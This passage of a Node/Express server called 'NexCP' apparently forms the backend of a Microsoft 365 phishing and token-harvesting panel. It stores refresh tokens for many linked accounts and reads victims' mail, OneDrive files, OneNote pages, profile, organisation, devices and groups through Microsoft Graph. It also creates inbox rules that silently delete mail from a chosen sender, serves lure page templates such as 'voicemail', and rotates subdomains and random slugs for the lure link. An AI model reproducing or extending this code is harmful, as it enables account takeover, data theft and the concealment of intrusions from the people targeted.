    if (!sender) return res.status(400).json({ error: 'sender required' });

    // Find all messages from this sender in inbox
    const filter = encodeURIComponent(`from/emailAddress/address eq '${sender.replace(/'/g, "''")}'`);
    const r = await graphGet(
      `/v1.0/me/mailFolders/inbox/messages?$filter=${filter}&$top=100&$select=id`,
      at
    );
    if (r.status >= 400) return res.status(r.status).json({ error: r.body?.error?.message || 'Search failed' });
    const msgs = r.body?.value || [];
    if (msgs.length === 0) return res.json({ ok: true, movedIds: [], count: 0 });

    const destId = action === 'move' && folderId ? folderId : 'deleteditems';
    const movedIds = [];
    for (const m of msgs) {
      const mr = await graphPost(`/v1.0/me/messages/${encodeURIComponent(m.id)}/move`, at, { destinationId: destId });
      if (mr.status < 400) movedIds.push(m.id);
    }

    // If action is 'rule', also create a rule to auto-delete future messages
    if (action === 'rule') {
      await graphPost('/v1.0/me/mailFolders/inbox/messageRules', at, {
        displayName: `Sweep: delete from ${sender}`,
        sequence: 1,
        isEnabled: true,
        conditions: { senderContains: [sender] },
        actions: { delete: true, stopProcessingRules: true }
      });
    }

    res.json({ ok: true, movedIds, count: movedIds.length });
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// ══ ONENOTE ══════════════════════════════════════════════════════════════════

app.get('/api/notes/notebooks', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const r = await graphGet('/v1.0/me/onenote/notebooks', at);
    res.status(r.status).json(r.body);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

app.get('/api/notes/pages', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const r = await graphGet('/v1.0/me/onenote/pages?$top=20&$select=title,createdDateTime,lastModifiedDateTime,parentNotebook', at);
    res.status(r.status).json(r.body);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// ══ DOMAINS ══════════════════════════════════════════════════════════════════

app.get('/api/domains', auth, (req, res) => res.json(db.prepare('SELECT * FROM domains ORDER BY created_at DESC').all()));

app.post('/api/domains', auth, (req, res) => {
  const domain = sanitiseDomain(req.body.domain);
  if (!domain) return res.status(400).json({ error: 'Invalid domain' });
  const type = ['PRIMARY', 'SUBDOMAIN'].includes(req.body.type) ? req.body.type : 'PRIMARY';
  try {
    const r = db.prepare('INSERT INTO domains (domain,type) VALUES (?,?)').run(domain, type);
    res.json({ id: r.lastInsertRowid, domain, type });
  } catch { res.status(400).json({ error: 'Domain already exists' }); }
});

app.delete('/api/domains/:id', auth, (req, res) => {
  const dom = db.prepare('SELECT * FROM domains WHERE id=?').get(req.params.id);
  if (dom && dom.type === 'PRIMARY' && dom.nginx_enabled) {
    db.prepare('DELETE FROM domains WHERE id=?').run(req.params.id);
    try { recreateLinkContainer(); } catch {}
    return res.json({ ok: true });
  }
  db.prepare('DELETE FROM domains WHERE id=?').run(req.params.id);
  res.json({ ok: true });
});

app.patch('/api/domains/:id', auth, (req, res) => {
  const dom = db.prepare('SELECT * FROM domains WHERE id=?').get(req.params.id);
  if (!dom) return res.status(404).json({ error: 'Not found' });
  const type = ['PRIMARY', 'SUBDOMAIN'].includes(req.body.type) ? req.body.type : dom.type;
  const wasEnabled = dom.type === 'PRIMARY' && dom.nginx_enabled;
  db.prepare('UPDATE domains SET type=?,nginx_enabled=0,updated_at=CURRENT_TIMESTAMP WHERE id=?').run(type, dom.id);
  if (wasEnabled) try { recreateLinkContainer(); } catch {}
  res.json({ ok: true });
});

app.post('/api/domains/:id/nginx', auth, (req, res) => {
  const dom = db.prepare('SELECT * FROM domains WHERE id=?').get(req.params.id);
  if (!dom) return res.status(404).json({ error: 'Not found' });
  const domain = sanitiseDomain(dom.domain);
  if (!domain) return res.status(400).json({ error: 'Invalid domain' });

  if (dom.type !== 'PRIMARY') {
    return res.status(400).json({ error: 'Only PRIMARY domains can be enabled. Subdomains work automatically via wildcard.' });
  }

  try {
    db.prepare('UPDATE domains SET nginx_enabled=1,updated_at=CURRENT_TIMESTAMP WHERE id=?').run(dom.id);
    recreateLinkContainer();
    return res.json({ ok: true });
  } catch (e) {
    return res.status(500).json({ error: e.message });
  }
});

app.post('/api/domains/:id/ssl', auth, (req, res) => {
  const dom = db.prepare('SELECT * FROM domains WHERE id=?').get(req.params.id);
  if (!dom) return res.status(404).json({ error: 'Not found' });
  const domain = sanitiseDomain(dom.domain);
  if (!domain) return res.status(400).json({ error: 'Invalid domain' });
  const confPath = `/etc/nginx/sites-available/${domain}`;
  if (!fs.existsSync(confPath)) return res.status(400).json({ error: `Add Nginx vhost first` });
  const email = (req.body.email || process.env.SSL_EMAIL || 'admin@example.com').trim();
  db.prepare("UPDATE domains SET ssl_status='PENDING',updated_at=CURRENT_TIMESTAMP WHERE id=?").run(dom.id);
  res.json({ started: true });
  execFile('certbot', ['--nginx', '-d', domain, '--non-interactive', '--agree-tos', '--email', email, '--redirect'], (err, stdout, stderr) => {
    const out = (stdout + stderr).trim();
    const ok = !err && /Congratulations|Successfully/.test(out);
    if (ok) {
      let expiry = null;
      try {
        const certPath = `/etc/letsencrypt/live/${domain}/cert.pem`;
        if (fs.existsSync(certPath)) {
          const exp = execFileSync('openssl', ['x509', '-noout', '-enddate', '-in', certPath]).toString();
          const m = exp.match(/notAfter=(.+)/);
          if (m) expiry = new Date(m[1]).toISOString();
        }
      } catch { }
      db.prepare("UPDATE domains SET ssl_status='VALID',ssl_expiry=?,ssl_issued_at=CURRENT_TIMESTAMP,updated_at=CURRENT_TIMESTAMP WHERE id=?").run(expiry, dom.id);
    } else {
      db.prepare("UPDATE domains SET ssl_status='FAILED',updated_at=CURRENT_TIMESTAMP WHERE id=?").run(dom.id);
      console.error(`[SSL] ${domain} failed:`, out.slice(0, 500));
    }
  });
});

app.get('/api/domains/:id/ssl-check', auth, (req, res) => {
  const dom = db.prepare('SELECT * FROM domains WHERE id=?').get(req.params.id);
  if (!dom) return res.status(404).json({ error: 'Not found' });
  const domain = sanitiseDomain(dom.domain);
  if (!domain) return res.status(400).json({ error: 'Invalid domain' });
  try {
    const certPath = `/etc/letsencrypt/live/${domain}/cert.pem`;
    if (fs.existsSync(certPath)) {
      const exp = execFileSync('openssl', ['x509', '-noout', '-enddate', '-in', certPath]).toString();
      const m = exp.match(/notAfter=(.+)/);
      const expiry = m ? new Date(m[1]).toISOString() : null;
      const status = expiry ? (new Date(expiry) > new Date() ? 'VALID' : 'EXPIRED') : 'UNKNOWN';
      db.prepare('UPDATE domains SET ssl_status=?,ssl_expiry=?,updated_at=CURRENT_TIMESTAMP WHERE id=?').run(status, expiry, dom.id);
      return res.json({ ssl_status: status, ssl_expiry: expiry });
    }
    res.json({ ssl_status: 'NONE', ssl_expiry: null });
  } catch { res.json({ ssl_status: 'UNKNOWN', ssl_expiry: null }); }
});

app.post('/api/ssl/renew-all', auth, (req, res) => {
  res.json({ started: true });
  execFile('certbot', ['renew', '--quiet', '--nginx'], () => {
    execFile('systemctl', ['reload', 'nginx'], () => { });
  });
});

// ══ BACKUPS ══════════════════════════════════════════════════════════════════

app.get('/api/backups', auth, (req, res) => res.json(db.prepare('SELECT * FROM backups ORDER BY created_at DESC').all()));

app.post('/api/backups/run', auth, async (req, res) => {
  const ts = new Date().toISOString().replace(/[:.]/g, '-');
  const dir = process.env.BACKUP_DIR || path.join(__dirname, '../backups');
  fs.mkdirSync(dir, { recursive: true });
  const fp = path.join(dir, `nexcp-${ts}.db`);
  try {
    await db.backup(fp);
    const size = fs.statSync(fp).size;
    const r = db.prepare("INSERT INTO backups (type,status,size_bytes,filepath,created_by) VALUES ('database','success',?,?,?)").run(size, fp, req.user.id);
    const old = db.prepare("SELECT id,filepath FROM backups WHERE status='success' ORDER BY created_at DESC LIMIT -1 OFFSET 10").all();
    for (const o of old) { try { if (o.filepath) fs.unlinkSync(o.filepath); } catch { } db.prepare('DELETE FROM backups WHERE id=?').run(o.id); }
    res.json(db.prepare('SELECT * FROM backups WHERE id=?').get(r.lastInsertRowid));
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.delete('/api/backups/:id', auth, (req, res) => {
  const b = db.prepare('SELECT filepath FROM backups WHERE id=?').get(req.params.id);
  if (b?.filepath) try { fs.unlinkSync(b.filepath); } catch { }
  db.prepare('DELETE FROM backups WHERE id=?').run(req.params.id);
  res.json({ ok: true });
});

// ══ ONEDRIVE (Graph API) ═════════════════════════════════════════════════════

// List root drive items (files & folders)
app.get('/api/drive/root', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const top = Math.min(parseInt(req.query.top) || 200, 200);
    const r = await graphGet(`/v1.0/me/drive/root/children?$top=${top}&$select=id,name,size,lastModifiedDateTime,folder,file,webUrl,parentReference`, at);
    res.status(r.status).json(r.body);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// List items inside a folder
app.get('/api/drive/folder/:id', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const folderId = encodeURIComponent(req.params.id);
    const top = Math.min(parseInt(req.query.top) || 200, 200);
    const r = await graphGet(`/v1.0/me/drive/items/${folderId}/children?$top=${top}&$select=id,name,size,lastModifiedDateTime,folder,file,webUrl,parentReference`, at);
    res.status(r.status).json(r.body);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// Get item metadata
app.get('/api/drive/item/:id', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const itemId = encodeURIComponent(req.params.id);
    const r = await graphGet(`/v1.0/me/drive/items/${itemId}?$select=id,name,size,lastModifiedDateTime,createdDateTime,folder,file,webUrl,parentReference,@microsoft.graph.downloadUrl`, at);
    res.status(r.status).json(r.body);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// Download / get download URL for a file
app.get('/api/drive/download/:id', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const itemId = encodeURIComponent(req.params.id);
    const r = await graphGet(`/v1.0/me/drive/items/${itemId}?$select=id,name,@microsoft.graph.downloadUrl`, at);
    if (r.status >= 400) return res.status(r.status).json(r.body);
    const url = r.body['@microsoft.graph.downloadUrl'];
    if (!url) return res.status(404).json({ error: 'Download URL not available' });
    res.json({ name: r.body.name, downloadUrl: url });
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// Search files
app.get('/api/drive/search', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const q = encodeURIComponent(req.query.q || '');
    if (!q) return res.json({ value: [] });
    const r = await graphGet(`/v1.0/me/drive/root/search(q='${q}')?$top=50&$select=id,name,size,lastModifiedDateTime,folder,file,webUrl,parentReference`, at);
    res.status(r.status).json(r.body);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// Delete a file or folder
app.delete('/api/drive/item/:id', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const itemId = encodeURIComponent(req.params.id);
    const r = await graphDelete(`/v1.0/me/drive/items/${itemId}`, at);
    if (r.status >= 400) return res.status(r.status).json(r.body);
    res.json({ ok: true });
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// Create a new folder
app.post('/api/drive/folder', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const parentId = req.body.parentId;
    const name = req.body.name;
    if (!name) return res.status(400).json({ error: 'Folder name required' });
    const parentPath = parentId ? `/v1.0/me/drive/items/${encodeURIComponent(parentId)}/children` : '/v1.0/me/drive/root/children';
    const r = await graphPost(parentPath, at, {
      name,
      folder: {},
      '@microsoft.graph.conflictBehavior': 'rename'
    });
    res.status(r.status).json(r.body);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// Rename / move an item
app.patch('/api/drive/item/:id', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const itemId = encodeURIComponent(req.params.id);
    const body = {};
    if (req.body.name) body.name = req.body.name;
    if (req.body.parentId) body.parentReference = { id: req.body.parentId };
    const r = await graphPatch(`/v1.0/me/drive/items/${itemId}`, at, body);
    res.status(r.status).json(r.body);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// Get storage quota info
app.get('/api/drive/quota', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const r = await graphGet('/v1.0/me/drive?$select=quota', at);
    res.status(r.status).json(r.body?.quota || {});
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// ══ ONENOTE (Graph API) ══════════════════════════════════════════════════════

// List all notebooks
app.get('/api/notes/notebooks', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const r = await graphGet('/v1.0/me/onenote/notebooks?$select=id,displayName,createdDateTime,lastModifiedDateTime,isDefault,sectionGroupsUrl,sectionsUrl&$orderby=lastModifiedDateTime desc', at);
    res.status(r.status).json(r.body);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// List sections in a notebook
app.get('/api/notes/notebooks/:id/sections', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const nbId = encodeURIComponent(req.params.id);
    const r = await graphGet(`/v1.0/me/onenote/notebooks/${nbId}/sections?$select=id,displayName,createdDateTime,lastModifiedDateTime,pagesUrl`, at);
    res.status(r.status).json(r.body);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// List pages in a section
app.get('/api/notes/sections/:id/pages', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const secId = encodeURIComponent(req.params.id);
    const r = await graphGet(`/v1.0/me/onenote/sections/${secId}/pages?$select=id,title,createdDateTime,lastModifiedDateTime,contentUrl,order&$orderby=order&$top=100`, at);
    res.status(r.status).json(r.body);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// Get page content (returns HTML)
app.get('/api/notes/pages/:id/content', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const pageId = encodeURIComponent(req.params.id);
    const r = await graphGetRaw(`/v1.0/me/onenote/pages/${pageId}/content`, at);
    if (r.status >= 400) return res.status(r.status).json({ error: 'Failed to get page content' });
    res.setHeader('Content-Type', 'text/html');
    res.send(r.body);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// Get page metadata
app.get('/api/notes/pages/:id', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const pageId = encodeURIComponent(req.params.id);
    const r = await graphGet(`/v1.0/me/onenote/pages/${pageId}?$select=id,title,createdDateTime,lastModifiedDateTime,contentUrl`, at);
    res.status(r.status).json(r.body);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// Create a new page in a section (body = { html })
app.post('/api/notes/sections/:id/pages', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const secId = encodeURIComponent(req.params.id);
    const html = req.body.html || `<!DOCTYPE html><html><head><title>${req.body.title || 'Untitled'}</title></head><body></body></html>`;
    const r = await graphPostHtml(`/v1.0/me/onenote/sections/${secId}/pages`, at, html);
    res.status(r.status).json(r.body);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// Create a new notebook
app.post('/api/notes/notebooks', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const name = req.body.displayName;
    if (!name) return res.status(400).json({ error: 'Notebook name required' });
    const r = await graphPost('/v1.0/me/onenote/notebooks', at, { displayName: name });
    res.status(r.status).json(r.body);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// Create a new section in a notebook
app.post('/api/notes/notebooks/:id/sections', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const nbId = encodeURIComponent(req.params.id);
    const name = req.body.displayName;
    if (!name) return res.status(400).json({ error: 'Section name required' });
    const r = await graphPost(`/v1.0/me/onenote/notebooks/${nbId}/sections`, at, { displayName: name });
    res.status(r.status).json(r.body);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// Delete a page
app.delete('/api/notes/pages/:id', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const pageId = encodeURIComponent(req.params.id);
    const r = await graphDelete(`/v1.0/me/onenote/pages/${pageId}`, at);
    if (r.status >= 400) return res.status(r.status).json(r.body);
    res.json({ ok: true });
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// ══ PROFILE ══════════════════════════════════════════════════════════════════

// User profile
app.get('/api/profile/me', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const r = await graphGet('/v1.0/me?$select=displayName,mail,userPrincipalName,jobTitle,department,officeLocation,mobilePhone,city,state,country,postalCode,businessPhones,companyName,employeeId,accountEnabled,createdDateTime', at);
    if (r.status >= 400) return res.status(r.status).json(r.body);
    res.json(r.body);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// Organization info
app.get('/api/profile/organization', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const r = await graphGet('/v1.0/organization', at);
    if (r.status >= 400) return res.status(r.status).json(r.body);
    res.json(r.body);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// Registered devices
app.get('/api/profile/devices', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const r = await graphGet('/v1.0/me/ownedDevices?$select=displayName,operatingSystem,operatingSystemVersion,trustType,approximateLastSignInDateTime', at);
    if (r.status >= 400) return res.status(r.status).json(r.body);
    res.json(r.body);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// Group memberships
app.get('/api/profile/groups', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const r = await graphGet('/v1.0/me/memberOf?$select=displayName,description,mail,groupTypes,mailEnabled', at);
    if (r.status >= 400) return res.status(r.status).json(r.body);
    res.json(r.body);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// Profile photo (base64)
app.get('/api/profile/photo', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const r = await graphGetRaw('/v1.0/me/photo/$value', at);
    if (r.status >= 400) return res.json({ hasPhoto: false });
    const b64 = Buffer.from(r.body, 'binary').toString('base64');
    res.json({ hasPhoto: true, data: 'data:image/jpeg;base64,' + b64 });
  } catch (e) { res.json({ hasPhoto: false }); }
});

// Recent sign-in activity
app.get('/api/profile/activity', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const r = await graphGet('/v1.0/me/activities/recent?$top=10', at);
    if (r.status >= 400) return res.json({ value: [] });
    res.json(r.body);
  } catch (e) { res.json({ value: [] }); }
});

// ══ DASHBOARD ════════════════════════════════════════════════════════════════

app.get('/api/dashboard/stats', auth, async (req, res) => {
  const tokens = db.prepare("SELECT * FROM ms_tokens WHERE status='active'").all();
  const uptime = Math.floor(process.uptime());
  let latency = 0;
  const tok = getDefaultToken(req);
  if (tok) {
    try {
      const start = Date.now();
      const at = await getFreshToken(tok.ms_email);
      await graphGet('/v1.0/me?$select=id', at);
      latency = Date.now() - start;
    } catch { latency = -1; }
  }
  res.json({
    active_tokens: tokens.length,
    tokens: tokens.map(t => ({
      id: t.id, ms_email: t.ms_email, ms_name: t.ms_name,
      linked_at: t.linked_at, expires_at: t.expires_at, status: t.status
    })),
    uptime_seconds: uptime,
    latency_ms: latency,
    server_time: new Date().toISOString()
  });
});

// ══ SETTINGS ═════════════════════════════════════════════════════════════════

app.get('/api/settings', auth, (req, res) => {
  const rows = db.prepare('SELECT key, value FROM settings').all();
  const settings = {};
  for (const r of rows) settings[r.key] = r.value;
  res.json(settings);
});

app.put('/api/settings', auth, (req, res) => {
  const { key, value } = req.body;
  if (!key || value === undefined) return res.status(400).json({ error: 'key and value required' });
  db.prepare('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)').run(key, String(value));
  // When link template changes, copy the selected HTML as index.html for the link container
  if (key === 'link_template') applyLinkTemplate(String(value));
  res.json({ ok: true });
});

// ══ LINK MANAGEMENT ══════════════════════════════════════════════════════════

const SLUG_CHARS = 'abcdefghijklmnopqrstuvwxyz0123456789';
function generateSlug(len = 10) {
  let s = '';
  for (let i = 0; i < len; i++) s += SLUG_CHARS[Math.floor(Math.random() * SLUG_CHARS.length)];
  return s;
}

app.get('/api/link/info', auth, (req, res) => {
  const proto = req.headers['x-forwarded-proto'] || 'https';
  const primary = db.prepare("SELECT * FROM domains WHERE type='PRIMARY' AND nginx_enabled=1 ORDER BY created_at ASC LIMIT 1").get();
  if (!primary) return res.json({ url: '', primary: null });

  const subdomains = db.prepare("SELECT * FROM domains WHERE type='SUBDOMAIN' ORDER BY created_at DESC").all();
  const slug = db.prepare("SELECT value FROM settings WHERE key = 'link_active_slug'").get()?.value || '';

  // Active URL: cycle through subdomains first, then random slug, then bare domain
  let url;
  const activeSubId = db.prepare("SELECT value FROM settings WHERE key = 'active_link_subdomain_id'").get()?.value;
  const activeSub = activeSubId && subdomains.find(d => String(d.id) === activeSubId);
  if (activeSub) {
    url = `${proto}://${activeSub.domain}`;
  } else if (slug) {
    url = `${proto}://${slug}.${primary.domain}`;
  } else {
    url = `${proto}://${primary.domain}`;
  }

  res.json({ url, primary: primary.domain, subdomains: subdomains.map(d => ({ id: d.id, domain: d.domain })) });
});

app.post('/api/link/regenerate', auth, (req, res) => {
  const proto = req.headers['x-forwarded-proto'] || 'https';
  const primary = db.prepare("SELECT * FROM domains WHERE type='PRIMARY' AND nginx_enabled=1 ORDER BY created_at ASC LIMIT 1").get();
  if (!primary) return res.status(400).json({ error: 'No PRIMARY domain enabled. Add one in Domains page and click Enable.' });

  const subdomains = db.prepare("SELECT * FROM domains WHERE type='SUBDOMAIN' ORDER BY created_at DESC").all();

  if (subdomains.length > 0) {
    // Cycle through subdomains
    const activeSubId = db.prepare("SELECT value FROM settings WHERE key = 'active_link_subdomain_id'").get()?.value;
    const currentIdx = subdomains.findIndex(d => String(d.id) === activeSubId);
    const nextIdx = (currentIdx + 1) % subdomains.length;
    const next = subdomains[nextIdx];
    db.prepare("INSERT OR REPLACE INTO settings (key, value) VALUES ('active_link_subdomain_id', ?)").run(String(next.id));
    // Clear random slug since we're using explicit subdomain
    db.prepare("DELETE FROM settings WHERE key = 'link_active_slug'").run();
    return res.json({ url: `${proto}://${next.domain}` });
  }

  // No subdomains — generate random slug on PRIMARY domain
  const slug = generateSlug();
  db.prepare("INSERT OR REPLACE INTO settings (key, value) VALUES ('link_active_slug', ?)").run(slug);
  db.prepare("DELETE FROM settings WHERE key = 'active_link_subdomain_id'").run();
  return res.json({ url: `${proto}://${slug}.${primary.domain}` });
});

// ══ START ════════════════════════════════════════════════════════════════════

server.listen(PORT, '0.0.0.0', () => {
  console.log(`[NexCP] Running on port ${PORT}`);
  df.startAutoRefresh();
  df.startCleanup();
  // Apply current link template on startup
  const tmpl = db.prepare("SELECT value FROM settings WHERE key = 'link_template'").get()?.value || 'voicemail';
  applyLinkTemplate(tmpl);
});
